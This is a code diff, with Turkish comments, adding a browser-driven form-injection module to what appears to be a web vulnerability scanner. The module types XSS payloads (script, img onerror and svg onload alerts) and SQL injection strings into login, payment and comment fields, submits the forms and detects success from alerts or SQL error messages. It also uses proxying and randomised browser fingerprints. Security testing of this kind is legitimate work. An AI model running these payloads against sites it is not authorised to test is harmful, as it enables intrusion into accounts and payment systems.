@@ -737,9 +737,553 @@ def should_use_browser_crawler(http_result: Dict) -> bool:
     return False
 
 
+# ===========================================================================
+# Görünür-tarayıcı FORM ENJEKSİYONU — BrowserFormInjector
+# ---------------------------------------------------------------------------
+# Mevcut HTTP-katmanı form taraması (scanners.base.submit_form_variants) payload'ı
+# arka planda requests.Session ile gönderir — kullanıcı GÖREMEZ. Bu sınıf payload'ı
+# GERÇEK Chrome penceresinde ilgili input alanına (kullanıcı adı / e-posta / şifre /
+# kart numarası / CVV / yorum kutusu / arama) TEK TEK YAZAR, formu gönderir ve
+# sonucu (alert dialog = onaylı XSS, SQL hata imzası = error-based SQLi) gözler.
+# Görünür mod (show_browser) açıkken her adım izlenebilir.
+# ===========================================================================
+
+# Alan bağlamına göre benign (zararsız) varsayılan değerler — hedef-DIŞI alanlar
+# formun geçerli kalması için bunlarla doldurulur, böylece submit gerçekten gider.
+_BENIGN_BY_CONTEXT: Dict[str, str] = {
+    "email":    "tester@example.com",
+    "username": "tester",
+    "password": "Passw0rd!23",
+    "card":     "4111111111111111",
+    "cvv":      "123",
+    "iban":     "DE89370400440532013000",
+    "expiry":   "12/29",
+    "search":   "test",
+    "comment":  "test",
+    "generic":  "test",
+}
+
+# SQL hata imzaları (DB-bağımsız) — submit sonrası sayfa içeriğinde aranır.
+_SQL_ERROR_RE = re.compile(
+    r"(SQL syntax.*?MySQL|Warning.*?\bmysqli?_|MySqlException|valid MySQL result|"
+    r"PostgreSQL.*?ERROR|Warning.*?\bpg_|valid PostgreSQL result|Npgsql\.|"
+    r"Microsoft SQL Server|ODBC SQL Server Driver|SQLServer JDBC Driver|"
+    r"System\.Data\.SqlClient|Unclosed quotation mark after the character string|"
+    r"quoted string not properly terminated|ORA-\d{5}|Oracle error|"
+    r"SQLite/JDBCDriver|SQLite3?::|sqlite3\.OperationalError|"
+    r"You have an error in your SQL syntax)",
+    re.IGNORECASE | re.DOTALL,
+)
+
+_INJ_SKIP_TYPES = {"submit", "button", "image", "reset", "file", "checkbox", "radio", "hidden"}
+
+# XSS doğrulama marker'ı — payload'a gömülür, alert mesajında aranır (onaylı XSS).
+_MARKER = "WSXSS6F2A"
+
+# Doküman sırasına göre her input/textarea'ya kararlı bir data-ws-fuzz indeksi atar
+# ve metadata döndürür. Re-navigasyon sonrası DOM sırası aynı kaldığından indeks
+# kararlıdır → aynı alanı tekrar seçebiliriz.
+_TAG_FIELDS_JS = """
+() => {
+    const skip = new Set(['submit','button','image','reset','file','checkbox','radio','hidden']);
+    const forms = Array.from(document.querySelectorAll('form'));
+    forms.forEach((f, fi) => f.setAttribute('data-ws-form', String(fi)));
+    const els = Array.from(document.querySelectorAll('input, textarea'));
+    const meta = [];
+    els.forEach((el, i) => {
+        el.setAttribute('data-ws-fuzz', String(i));
+        let cs; try { cs = window.getComputedStyle(el); } catch (e) { cs = {}; }
+        const visible = (el.offsetParent !== null || cs.position === 'fixed')
+                        && cs.visibility !== 'hidden' && cs.display !== 'none';
+        const tag = el.tagName.toLowerCase();
+        const type = (el.getAttribute('type') || (tag === 'textarea' ? 'textarea' : 'text')).toLowerCase();
+        let formIndex = -1;
+        if (el.form) formIndex = forms.indexOf(el.form);
+        meta.push({
+            idx: i, name: el.getAttribute('name') || '', id: el.id || '',
+            type: type, tag: tag,
+            placeholder: el.getAttribute('placeholder') || '',
+            autocomplete: el.getAttribute('autocomplete') || '',
+            aria: el.getAttribute('aria-label') || '',
+            formIndex: formIndex, visible: !!visible,
+            disabled: el.disabled === true, skip: skip.has(type)
+        });
+    });
+    return meta;
+}
+"""
+
+
+def _classify_input_context(meta: Dict[str, Any]) -> str:
+    """Bir input alanını içeriğine göre sınıflandır (name/id/type/placeholder/...)."""
+    t = str(meta.get("type") or "text").lower()
+    blob = " ".join(str(meta.get(k) or "") for k in
+                    ("name", "id", "placeholder", "autocomplete", "aria")).lower()
+    if t == "password" or any(k in blob for k in ("password", "passwd", "pwd", "şifre", "sifre")):
+        return "password"
+    if any(k in blob for k in ("cardnumber", "card_number", "card-number", "cc-number",
+                               "ccnumber", "cardno", "creditcard", "kartnumar", "kart no",
+                               "card number")):
+        return "card"
+    if any(k in blob for k in ("cvv", "cvc", "securitycode", "security code", "güvenlik kod",
+                               "guvenlik kod")):
+        return "cvv"
+    if "iban" in blob:
+        return "iban"
+    if any(k in blob for k in ("expir", "exp-date", "exp_month", "exp_year", "son kullan",
+                               "mm/yy", "aa/yy")):
+        return "expiry"
+    if t == "email" or any(k in blob for k in ("email", "e-mail", "e-posta", "eposta", "mail")):
+        return "email"
+    if any(k in blob for k in ("user", "login", "uname", "nick", "account", "kullanıcı", "kullanici")):
+        return "username"
+    if str(meta.get("name") or "").lower() == "q" or any(k in blob for k in ("search", "query", "ara")):
+        return "search"
+    if meta.get("tag") == "textarea" or any(k in blob for k in (
+            "comment", "message", "review", "feedback", "bio", "about", "description",
+            "content", "body", "post", "yorum", "mesaj", "açıklama", "aciklama")):
+        return "comment"
+    return "generic"
+
+
+def _payloads_for_context(context: str, marker: str, per_field: int = 2) -> List[Tuple[str, str]]:
+    """(vuln_type, payload) listesi döndür. Marker XSS payload'larına gömülür."""
+    xss = [
+        ("XSS", f'"><img src=x onerror=alert("{marker}")>'),
+        ("XSS", f'<script>alert("{marker}")</script>'),
+        ("XSS", f"'><svg onload=alert('{marker}')>"),
+    ]
+    sqli_str = [
+        ("SQLi", "' OR '1'='1"),
+        ("SQLi", "admin'--"),
+        ("SQLi", "' OR 1=1-- -"),
+    ]
+    sqli_num = [
+        ("SQLi", "1 OR 1=1"),
+        ("SQLi", "1' OR '1'='1"),
+    ]
+    if context == "password":
+        chosen = sqli_str
+    elif context in ("card", "cvv", "iban", "expiry"):
+        chosen = sqli_num[:1] + xss[:1]
+    elif context == "comment":
+        chosen = xss
+    elif context in ("email", "username"):
+        chosen = sqli_str[:1] + xss[:1]
+    else:  # search / generic
+        chosen = xss[:1] + sqli_str[:1]
+    # tekilleştir + kırp
+    seen: Set[str] = set()
+    out: List[Tuple[str, str]] = []
+    for vt, p in chosen:
+        if p in seen:
+            continue
+        seen.add(p)
+        out.append((vt, p))
+        if len(out) >= per_field:
+            break
+    return out
+
+
+@dataclass
+class InjectionFinding:
+    url: str
+    field_name: str
+    field_context: str
+    vuln_type: str        # "XSS" | "SQLi"
+    payload: str
+    evidence: str
+    severity: str = "High"
+
+
+class BrowserFormInjector:
+    """
+    Görünür Chrome'da form alanlarına payload yazıp gönderen aktif enjeksiyon motoru.
+
+    İş akışı (her alan × her payload için):
+      1. Sayfaya git (temiz durum), input/textarea'ları kararlı indeksle etiketle.
+      2. Hedef alanı payload ile, aynı formdaki diğer alanları benign değerlerle doldur
+         (GÖRÜNÜR: karakter karakter yazılır).
+      3. Formu gönder (submit butonuna tıkla / Enter).
+      4. Gözle: alert dialog (marker'lı) → onaylı XSS; SQL hata imzası → error-based SQLi.
+    """
+
+    def __init__(
+        self,
+        config: Optional[BrowserCrawlConfig] = None,
+        *,
+        max_pages: int = 10,
+        max_forms_per_page: int = 5,
+        max_fields_per_form: int = 8,
+        payloads_per_field: int = 2,
+        max_total_seconds: int = 300,
+    ) -> None:
+        self.config = config or BrowserCrawlConfig()
+        self.max_pages = max_pages
+        self.max_forms_per_page = max_forms_per_page
+        self.max_fields_per_form = max_fields_per_form
+        self.payloads_per_field = payloads_per_field
+        self.max_total_seconds = max_total_seconds
+        self._findings: List[InjectionFinding] = []
+        self._seen: Set[Tuple[str, str, str]] = set()
+        self._deadline: float = 0.0
+
+    # -- yardımcılar --------------------------------------------------------
+
+    def _over_budget(self) -> bool:
+        return self._deadline > 0 and _time.monotonic() > self._deadline
+
+    @staticmethod
+    async def _type_into(el, value: str) -> bool:
+        """Bir elemana GÖRÜNÜR şekilde (karakter karakter) yaz; başarısızsa fill'e düş."""
+        try:
+            await el.scroll_into_view_if_needed(timeout=2000)
+        except Exception:
+            pass
+        try:
+            await el.click(timeout=2000)
+        except Exception:
+            pass
+        try:
+            await el.fill("")  # önce temizle
+        except Exception:
+            pass
+        for meth, kw in (("press_sequentially", {"delay": 35}),
+                         ("type", {"delay": 35})):
+            fn = getattr(el, meth, None)
+            if fn is None:
+                continue
+            try:
+                await fn(value, **kw)
+                return True
+            except Exception:
+                continue
+        try:
+            await el.fill(value)
+            return True
+        except Exception:
+            return False
+
+    async def _submit_group(self, page, form_index: int, target_idx: int) -> None:
+        """Form grubunu gönder: form ise submit butonuna tıkla; loose ise Enter + buton."""
+        if form_index >= 0:
+            for sel in (
+                f'[data-ws-form="{form_index}"] button[type="submit"]',
+                f'[data-ws-form="{form_index}"] input[type="submit"]',
+                f'[data-ws-form="{form_index}"] button',
+            ):
+                try:
+                    btn = await page.query_selector(sel)
+                    if btn:
+                        await btn.click(timeout=3000)
+                        return
+                except Exception:
+                    continue
+            # buton yoksa form.requestSubmit()/submit()
+            try:
+                await page.evaluate(
+                    """(fi) => { const f = document.querySelector('[data-ws-form="'+fi+'"]');
+                        if (!f) return; try { f.requestSubmit ? f.requestSubmit() : f.submit(); } catch(e){} }""",
+                    str(form_index),
+                )
+                return
+            except Exception:
+                pass
+        # loose input (form yok): hedefte Enter, sonra görünür bir submit-benzeri butona tıkla
+        try:
+            tgt = await page.query_selector(f'[data-ws-fuzz="{target_idx}"]')
+            if tgt:
+                await tgt.press("Enter")
+        except Exception:
+            pass
+        try:
+            await page.evaluate(
+                """() => {
+                    const re = /(login|log in|sign in|submit|giriş|gonder|gönder|kaydet|öde|pay|ara|search|continue|devam)/i;
+                    const btns = Array.from(document.querySelectorAll('button, input[type=button], [role=button], a'));
+                    const hit = btns.find(b => re.test((b.innerText || b.value || '').trim()));
+                    if (hit) hit.click();
+                }"""
+            )
+        except Exception:
+            pass
+
+    async def _observe(self, page, marker: str, vuln_type: str,
+                       dialog_box: List[str]) -> Optional[str]:
+        """Submit sonrası kanıt topla. XSS: marker'lı dialog. SQLi: hata imzası."""
+        try:
+            await page.wait_for_timeout(700)
+        except Exception:
+            pass
+        if vuln_type == "XSS":
+            for msg in dialog_box:
+                if marker in (msg or ""):
+                    return f"JS alert tetiklendi (marker doğrulandı): {msg[:80]}"
+            return None
+        # SQLi — sayfa içeriğinde DB hata imzası
+        try:
+            content = await page.content()
+        except Exception:
+            content = ""
+        m = _SQL_ERROR_RE.search(content or "")
+        if m:
+            return f"SQL hata imzası yanıtta: {m.group(0)[:120]}"
+        return None
+
+    def _record(self, page_url: str, field_meta: Dict[str, Any], context: str,
+                vuln_type: str, payload: str, evidence: str) -> None:
+        fname = field_meta.get("name") or field_meta.get("id") or f"#{field_meta.get('idx')}"
+        key = (page_url, str(fname), vuln_type)
+        if key in self._seen:
+            return
+        self._seen.add(key)
+        self._findings.append(InjectionFinding(
+            url=page_url, field_name=str(fname), field_context=context,
+            vuln_type=vuln_type, payload=payload, evidence=evidence,
+            severity="High",
+        ))
+        _logger.info(
+            "[BrowserFormInjector] ONAYLI %s — %s alanı (%s) @ %s",
+            vuln_type, fname, context, page_url,
+        )
+
+    # -- ana akış -----------------------------------------------------------
+
+    async def _process_page(self, page, page_url: str, dialog_box: List[str]) -> None:
+        try:
+            resp = await page.goto(page_url, timeout=self.config.timeout_ms,
+                                   wait_until="domcontentloaded")
+        except Exception as exc:
+            _logger.debug("[BrowserFormInjector] goto hata %s: %r", page_url, exc)
+            return
+        status = getattr(resp, "status", None)
+        if status is not None and (status in (401, 403) or status >= 500):
+            _logger.debug("[BrowserFormInjector] blok/hata sayfası (HTTP %s) atlandı: %s",
+                          status, page_url)
+            return
+        try:
+            await page.wait_for_timeout(self.config.wait_after_load_ms or 800)
+            meta = await page.evaluate(_TAG_FIELDS_JS)
+        except Exception as exc:
+            _logger.debug("[BrowserFormInjector] alan etiketleme hata %s: %r", page_url, exc)
+            return
+
+        fuzzable = [m for m in (meta or [])
+                    if m.get("visible") and not m.get("disabled") and not m.get("skip")]
+        if not fuzzable:
+            return
+
+        # forma göre grupla (benign doldurma için)
+        groups: Dict[int, List[Dict[str, Any]]] = {}
+        for m in fuzzable:
+            groups.setdefault(int(m.get("formIndex", -1)), []).append(m)
+
+        form_keys = list(groups.keys())[:self.max_forms_per_page]
+        _logger.info("[BrowserFormInjector] %s → %d form grubu, %d alan",
+                     page_url, len(form_keys), len(fuzzable))
+
+        for fkey in form_keys:
+            group = groups[fkey][:self.max_fields_per_form]
+            for target in group:
+                if self._over_budget():
+                    return
+                context = _classify_input_context(target)
+                for vuln_type, payload in _payloads_for_context(
+                        context, _MARKER, self.payloads_per_field):
+                    if self._over_budget():
+                        return
+                    await self._attempt(page, page_url, fkey, group, target,
+                                        context, vuln_type, payload, dialog_box)
+
+    async def _attempt(self, page, page_url: str, form_index: int,
+                       group: List[Dict[str, Any]], target: Dict[str, Any],
+                       context: str, vuln_type: str, payload: str,
+                       dialog_box: List[str]) -> None:
+        """Tek deneme: temiz sayfa → doldur → gönder → gözle."""
+        # zaten bu alan+tip için bulgu varsa atla
+        fname = target.get("name") or target.get("id") or f"#{target.get('idx')}"
+        if (page_url, str(fname), vuln_type) in self._seen:
+            return
+        try:
+            await page.goto(page_url, timeout=self.config.timeout_ms,
+                            wait_until="domcontentloaded")
+            await page.wait_for_timeout(400)
+            await page.evaluate(_TAG_FIELDS_JS)  # yeniden etiketle (indeks kararlı)
+        except Exception:
+            return
+
+        # grup alanlarını doldur (hedef=payload, diğerleri=benign)
+        filled_target = False
+        for fld in group:
+            sel = f'[data-ws-fuzz="{fld.get("idx")}"]'
+            try:
+                el = await page.query_selector(sel)
+            except Exception:
+                el = None
+            if not el:
+                continue
+            if fld.get("idx") == target.get("idx"):
+                ok = await self._type_into(el, payload)
+                filled_target = filled_target or ok
+            else:
+                bctx = _classify_input_context(fld)
+                await self._type_into(el, _BENIGN_BY_CONTEXT.get(bctx, "test"))
+
+        if not filled_target:
+            return
+
+        dialog_box.clear()
+        await self._submit_group(page, form_index, int(target.get("idx")))
+        evidence = await self._observe(page, _MARKER, vuln_type, dialog_box)
+        if evidence:
+            self._record(page_url, target, context, vuln_type, payload, evidence)
+
+    async def run(self, target: str, page_urls: List[str]) -> List[InjectionFinding]:
+        if not _PLAYWRIGHT_AVAILABLE:
+            _logger.warning("[BrowserFormInjector] Playwright yok — görünür enjeksiyon atlanıyor.")
+            return []
+
+        # ziyaret listesi: hedef + form/login/checkout benzeri URL'ler (tekil, kapsam içi)
+        ordered: List[str] = []
+        for u in [target, *(page_urls or [])]:
+            if u and u not in ordered and _in_scope(u, target):
+                ordered.append(u)
+        ordered = ordered[:self.max_pages]
+
+        self._deadline = _time.monotonic() + max(30, self.max_total_seconds)
+
+        use_headless = self.config.headless and not self.config.show_browser
+        launch_opts: Dict[str, Any] = {"headless": use_headless}
+        if self.config.slow_mo_ms > 0 and not use_headless:
+            launch_opts["slow_mo"] = self.config.slow_mo_ms
+        if self.config.proxy_url:
+            _p = (self.config.proxy_url.replace("socks5h://", "socks5://")
+                                       .replace("socks4a://", "socks4://"))
+            launch_opts["proxy"] = {"server": _p}
+            launch_opts.setdefault("args", []).extend([
+                "--force-webrtc-ip-handling-policy=disable_non_proxied_udp",
+                "--disable-features=WebRtcHideLocalIpsWithMdns",
+                "--proxy-bypass-list=<-loopback>",
+            ])
+        if not use_headless:
+            _logger.info(
+                "[BrowserFormInjector] GÖRÜNÜR mod — Chrome açılıyor. Form alanlarına "
+                "(kullanıcı adı/e-posta/şifre/kart/yorum) payload yazılışını izleyebilirsiniz."
+            )
+
+        async with async_playwright() as pw:
+            try:
+                browser = await asyncio.wait_for(
+                    pw.chromium.launch(**launch_opts), timeout=90)
+            except Exception as exc:
+                _logger.error("[BrowserFormInjector] Chromium başlatılamadı: %r", exc)
+                return self._findings
+            ctx_opts: Dict[str, Any] = _random_browser_fingerprint()
+            if self.config.auth_storage_state:
+                ctx_opts["storage_state"] = self.config.auth_storage_state
+            try:
+                context = await browser.new_context(**ctx_opts)
+                if self.config.auth_cookies:
+                    await context.add_cookies(self.config.auth_cookies)
+                page = await context.new_page()
+            except Exception as exc:
+                _logger.error("[BrowserFormInjector] context/page kurulamadı: %r", exc)
+                await browser.close()
+                return self._findings
+
+            dialog_box: List[str] = []
+
+            def _on_dialog(d):
+                try:
+                    dialog_box.append(d.message or "")
+                except Exception:
+                    pass
+                try:
+                    asyncio.ensure_future(d.dismiss())
+                except Exception:
+                    pass
+
+            page.on("dialog", _on_dialog)
+
+            try:
+                for purl in ordered:
+                    if self._over_budget():
+                        _logger.info("[BrowserFormInjector] süre bütçesi doldu — durduruluyor.")
+                        break
+                    await self._process_page(page, purl, dialog_box)
+            finally:
+                try:
+                    page.remove_listener("dialog", _on_dialog)
+                except Exception:
+                    pass
+                try:
+                    await browser.close()
+                except Exception:
+                    pass
+
+        return self._findings
+
+
+def run_browser_form_injection(
+    target: str,
+    page_urls: Optional[List[str]] = None,
+    config: Optional[BrowserCrawlConfig] = None,
+    *,
+    max_total_seconds: int = 300,
+) -> List[Dict[str, Any]]:
+    """
+    Senkron sarmalayıcı: görünür-tarayıcı form enjeksiyonunu çalıştırır, bulguları
+    dict listesi olarak döndürür (phases bunu add_result'a yazar). Kendi event
+    loop'unu yönetir; Playwright/Chromium yoksa boş liste döner.
+    """
+    injector = BrowserFormInjector(config=config, max_total_seconds=max_total_seconds)
+
+    def _run(coro):
+        try:
+            loop = asyncio.get_event_loop_policy().get_event_loop()
+            if loop.is_closed():
+                raise RuntimeError("event loop is closed")
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        return loop.run_until_complete(coro)
+
+    try:
+        findings = _run(asyncio.wait_for(
+            injector.run(target, page_urls or []),
+            timeout=max(60, max_total_seconds + 120),
+        ))
+    except asyncio.TimeoutError:
+        _logger.warning("[BrowserFormInjector] sert süre tavanı aşıldı — kısmi sonuç.")
+        findings = injector._findings
+    except Exception as exc:
+        _logger.debug("[BrowserFormInjector] çalışma hatası: %r", exc)
+        findings = injector._findings
+
+    out: List[Dict[str, Any]] = []
+    for f in findings:
+        out.append({
+            "type": f.vuln_type,
+            "vuln_type": f.vuln_type,
+            "severity": f.severity,
+            "title": f"{f.vuln_type} (tarayıcı form enjeksiyonu): {f.field_name}",
+            "url": f.url,
+            "param": f.field_name,
+            "field_context": f.field_context,
+            "payload": f.payload,
+            "evidence": f.evidence,
+            "tool": "browser_form_injector",
+            "verified": True,
+        })
+    return out
+
+
 __all__ = [
     'BrowserCrawlConfig',
     'BrowserCrawlResult',
     'BrowserCrawler',
     'should_use_browser_crawler',
+    'BrowserFormInjector',
+    'InjectionFinding',
+    'run_browser_form_injection',
 ]
